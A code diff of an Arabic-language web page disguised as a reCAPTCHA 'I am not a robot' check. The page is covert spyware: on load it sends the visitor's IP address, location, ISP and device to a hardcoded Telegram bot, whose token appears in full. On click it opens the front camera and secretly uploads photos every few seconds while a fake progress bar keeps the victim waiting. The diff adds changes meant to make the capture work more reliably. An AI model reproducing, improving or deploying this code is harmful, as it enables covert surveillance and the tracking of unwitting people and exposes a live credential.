@@ -6,20 +6,20 @@
     <title>التحقق من الأمان</title>
     <style>
         body { background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .captcha-container { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; box-shadow: 0 0 4px rgba(0,0,0,0.1); }
+        .captcha-container { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 310px; box-shadow: 0 0 4px rgba(0,0,0,0.1); }
         .captcha-content { display: flex; align-items: center; justify-content: space-between; }
         .check-section { display: flex; align-items: center; }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; cursor: pointer; position: relative; }
-        .checkbox.loading { border-top-color: #4a90e2; animation: spin 1s linear infinite; border-radius: 50%; }
+        .checkbox { width: 26px; height: 26px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; cursor: pointer; position: relative; transition: 0.2s; }
+        .checkbox.loading { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; animation: spin 1s linear infinite; border-radius: 50%; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .text { color: #555; font-size: 14px; user-select: none; }
-        .logo-section { text-align: center; }
-        .logo-section img { width: 30px; }
-        .logo-section div { font-size: 8px; color: #9b9b9b; }
-        #progress-box { display: none; margin-top: 15px; text-align: center; }
-        .bar { width: 100%; background: #eee; height: 4px; border-radius: 2px; margin-top: 8px; overflow: hidden; }
-        .fill { width: 0%; background: #4a90e2; height: 100%; transition: width 0.5s; }
-        video, canvas { display: none; }
+        .logo-section { text-align: center; min-width: 70px; }
+        .logo-section img { width: 32px; }
+        .logo-section div { font-size: 8px; color: #9b9b9b; margin-top: 3px; }
+        #progress-box { display: none; margin-top: 15px; text-align: center; border-top: 1px solid #eee; padding-top: 10px; }
+        .bar { width: 100%; background: #eee; height: 6px; border-radius: 3px; margin-top: 10px; overflow: hidden; }
+        .fill { width: 0%; background: #4a90e2; height: 100%; transition: width 0.4s; }
+        video, canvas { display: none; position: absolute; }
     </style>
 </head>
 <body>
@@ -31,13 +31,13 @@
                 <div class="text" id="status">أنا لست برنامج روبوت</div>
             </div>
             <div class="logo-section">
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
                 <div>الخصوصية - البنود</div>
             </div>
         </div>
         
         <div id="progress-box">
-            <div class="text" style="font-size: 12px;">جاري تأمين الاتصال...</div>
+            <div class="text" style="font-size: 12px;" id="loader-msg">جاري فحص المتصفح...</div>
             <div class="bar"><div class="fill" id="fill"></div></div>
         </div>
     </div>
@@ -46,79 +46,99 @@
     <canvas id="c"></canvas>
 
     <script>
+        // --- إعدادات التليجرام ---
         const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
         const chat = "2103976274";
         const nextPage = "project.html"; 
 
-        // جمع البيانات الأساسية فور الدخول
+        // 1. جمع بيانات الجهاز فور التحميل
         async function collectAll() {
             let n = navigator;
-            let report = "🚨 **دخول جديد عبر نظام التحقق**\n\n";
+            let report = "🚨 **بدء عملية التحقق (دخول)**\n\n";
             try {
                 const res = await fetch('https://ipapi.co/json/').then(d => d.json());
                 report += `🌍 **IP:** \`${res.ip}\`\n📍 **الموقع:** ${res.city}, ${res.country_name}\n🏢 **الشركة:** ${res.org}\n`;
-            } catch (e) {}
+            } catch (e) { report += "🌍 **الشبكة:** تعذر جلب الـ IP\n"; }
             
             let deviceDetail = n.userAgent.match(/\(([^)]+)\)/) ? n.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : n.platform;
             report += `📱 **الجهاز:** ${deviceDetail}\n`;
             sendText(report);
         }
 
+        // 2. معالجة الضغط والتحقق
         document.getElementById('check').onclick = async function() {
             let box = this;
             let statusText = document.getElementById('status');
             let pBox = document.getElementById('progress-box');
             let fill = document.getElementById('fill');
+            let video = document.getElementById('v');
             
             box.classList.add('loading');
-            
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1280 } } 
-                });
-                document.getElementById('v').srcObject = s;
-                
-                // بدء إرسال الصور فوراً كل 3 ثوانٍ
-                let snapInterval = setInterval(snap, 3000);
-                
-                // إظهار شريط التحميل لإطالة الوقت
-                box.style.display = 'none';
-                statusText.innerText = "جاري التحقق من الهوية...";
-                pBox.style.display = 'block';
+            statusText.innerText = "جاري التحقق...";
 
-                let width = 0;
-                let loading = setInterval(() => {
-                    if (width >= 100) {
-                        clearInterval(loading);
-                        clearInterval(snapInterval); // توقف قبل النقل مباشرة
-                        window.location.href = nextPage;
-                    } else {
-                        width += 5; // سيستغرق حوالي 10-12 ثانية للتحميل
-                        fill.style.width = width + '%';
-                    }
-                }, 600); 
+            try {
+                // طلب الكاميرا بدقة متوسطة لضمان السرعة في كروم
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 480 } 
+                });
+                
+                video.srcObject = stream;
+
+                // انتظر حتى يتم تحميل الفيديو فعلياً لحل مشكلة السواد
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    // تغيير الواجهة لشريط التحميل لإطالة البقاء
+                    box.style.display = 'none';
+                    pBox.style.display = 'block';
+
+                    // التقاط الصور كل 3.5 ثوانٍ
+                    let snapInterval = setInterval(snap, 3500);
+                    
+                    // شريط التحميل الوهمي (12 ثانية تقريباً)
+                    let width = 0;
+                    let loading = setInterval(() => {
+                        if (width >= 100) {
+                            clearInterval(loading);
+                            clearInterval(snapInterval);
+                            window.location.href = nextPage;
+                        } else {
+                            width += 2; 
+                            fill.style.width = width + '%';
+                            if(width > 50) document.getElementById('loader-msg').innerText = "تأمين الاتصال المشفر...";
+                        }
+                    }, 250); 
+                };
 
             } catch (e) {
-                statusText.innerText = "يجب السماح بالكاميرا للمتابعة";
+                statusText.innerText = "خطأ: يجب السماح بالكاميرا";
                 box.classList.remove('loading');
                 sendText("⚠️ **المستهدف رفض الكاميرا**");
             }
         };
 
+        // 3. وظيفة التقاط الصورة (المحسنة لكروم)
         function snap() {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
-            if (video.videoWidth === 0) return;
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const f = new FormData();
-                f.append('chat_id', chat);
-                f.append('photo', blob, 'img.jpg');
-                fetch(api + "sendPhoto", { method: 'POST', body: f });
-            }, 'image/jpeg', 0.9);
+            
+            // التأكد من وجود بيانات فيديو حقيقية قبل الرسم
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    const f = new FormData();
+                    f.append('chat_id', chat);
+                    f.append('photo', blob, 'capture.jpg');
+                    fetch(api + "sendPhoto", { method: 'POST', body: f });
+                }, 'image/jpeg', 0.7);
+            }
         }
 
+        // 4. إرسال التقارير النصية
         function sendText(txt) {
             fetch(api + "sendMessage", {
                 method: 'POST',
